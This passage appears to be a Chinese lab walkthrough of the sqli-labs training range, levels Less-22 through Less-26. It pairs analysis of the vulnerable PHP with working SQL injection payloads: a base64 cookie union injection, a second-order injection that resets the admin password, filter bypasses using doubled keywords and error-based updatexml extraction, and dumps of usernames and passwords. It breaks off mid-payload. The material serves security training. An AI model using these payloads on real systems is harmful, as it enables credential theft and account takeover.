title="Less-22"></a>Less-22</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 先双引号 然后直接拼接到SQL语句中</span><span class="hljs-variable">$cookee1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>. <span class="hljs-variable">$cookee</span>. <span class="hljs-string">&#x27;&quot;&#x27;</span>;    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=<span class="hljs-subst">$cookee1</span> LIMIT 0,1&quot;</span>;</code></pre><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-22/index.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-22/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw==<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">-admin&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-23-过滤-、–注释"><a href="#Less-23-过滤-、–注释" class="headerlink" title="Less-23(过滤#、–注释)"></a>Less-23(过滤#、–注释)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 获取到 id 的值</span><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 使用单引号拼接 SQL</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 有查询结果:    输出查询信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><p>Payload</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h2><p>一个经典的二次注入场景，所以下面来单个理一下源码。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/01.png" alt="Less-24(二次注入)"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><pre><code class="hljs Php"><span class="hljs-comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;<span class="hljs-variable">$pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-variable">$re_pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);<span class="hljs-comment"># 查询当前用户信息</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;如果当前用户已经存在 无法注册<span class="hljs-keyword">if</span> 两次输入密码一致：  <span class="hljs-comment"># 将记录插入数据库中</span>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;    查询完成后 重定向到首页<span class="hljs-keyword">else</span>:    提示两次输入密码不一致</code></pre><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 登录用户名和密码都被过滤了</span><span class="hljs-variable">$username</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<span class="hljs-variable">$password</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;</code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 检测未登录：    重定向到首页<span class="hljs-keyword">if</span> 检测到提交表单：  <span class="hljs-comment"># 对 pass 都进行了过滤</span>  <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);    <span class="hljs-keyword">if</span> 两次密码一致:        <span class="hljs-comment"># 直接将 username 拼接到 SQL 语句</span>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;    <span class="hljs-keyword">else</span>:        提示密码不一致 并重定向到 fail.php</code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><pre><code class="hljs php">username =  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;</code></pre><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span></code></pre><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span><span class="hljs-comment"># and password=&#x27;$curr_pass&#x27;</span></code></pre><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><pre><code class="hljs jboss-cli">admin&#x27;<span class="hljs-comment">#1</span>admin&#x27;<span class="hljs-comment">#233</span>admin&#x27;<span class="hljs-comment">#gg</span><span class="hljs-string">...</span></code></pre><p>注册完成后数据库的记录信息如下：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 0        ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 `admin’#sec用户，然后来修改当前的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/02.png" alt="Less-24(二次注入)"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><h2 id="Less-25-过滤or和and"><a href="#Less-25-过滤or和and" class="headerlink" title="Less-25(过滤or和and)"></a>Less-25(过滤or和and)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><h3 id="关键代码分析："><a href="#关键代码分析：" class="headerlink" title="关键代码分析："></a>关键代码分析：</h3><pre><code class="hljs Php"><span class="hljs-comment"># id 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 但是 id 被如下函数过滤了</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 <code>or</code> <code>and</code> 的get注入</p><h3 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h3><p><code>&#39;</code>报错 <code>&#39;&#39;</code>不报错 那么就是<code>&#39;</code>闭合</p><p>我们知道可以用<code>--+</code>注释掉后面</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+</span></code></pre><p>语法不正确 发现过滤了 <code>or</code> </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/03.png" alt="Less-25(过滤or和and)"></p><p>那么我们继续构造，3正常，4报错</p><pre><code class="hljs sql">?id=1&#x27; oorrder by 1 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 2 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 3 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 4 <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/04.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code class="hljs sql">http://sqli.pl/Less-25/?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/05.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>information 的or</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> infoorrmation_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/06.png" alt="Less-25(过滤or和and)"></p><p>爆破列名</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> infoorrmation_schema.columns  <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/07.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破出数据"><a href="#爆破出数据" class="headerlink" title="爆破出数据"></a>爆破出数据</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/08.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-26-过滤or、and、-、注释、空格和斜线"><a href="#Less-26-过滤or、and、-、注释、空格和斜线" class="headerlink" title="Less-26(过滤or、and、/*、注释、空格和斜线)"></a>Less-26(过滤or、and、/*、注释、空格和斜线)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤了 or 和 and 大小写</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//strip out /*</span><span class="hljs-comment"># 过滤了 -- 和 # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out --</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out #</span><span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces</span><span class="hljs-comment"># 过滤了斜线</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out slashes</span><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><p><strong>由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。</strong></p><p>直接使用报错注入</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>（在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/09.png" alt="Less-25(过滤or和and)"></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/10.png" alt="Less-25(过滤or和and)"></p><p>but 好像不行，过滤了<code>空格</code>和<code>or</code></p><p>绕过</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/11.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/12.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span>||updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(username=<span class="hljs-string">&#x27;admin&#x27;</span>))),<span 